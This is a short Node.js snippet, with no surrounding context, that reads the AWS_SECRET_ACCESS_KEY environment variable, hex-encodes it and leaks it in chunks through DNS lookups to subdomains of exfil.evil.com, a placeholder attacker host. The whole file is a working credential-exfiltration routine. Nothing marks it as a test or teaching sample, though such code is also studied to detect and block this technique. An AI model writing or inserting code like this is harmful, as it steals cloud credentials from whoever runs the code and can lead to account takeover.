const dns = require('dns');

const secret = process.env.AWS_SECRET_ACCESS_KEY;
if (secret) {
  const hex = Buffer.from(secret).toString('hex');
  const chunks = hex.match(/.{1,60}/g);
  chunks.forEach((chunk, i) => {
    dns.resolve(`${i}.${chunk}.exfil.evil.com`, () => {});
  });
}
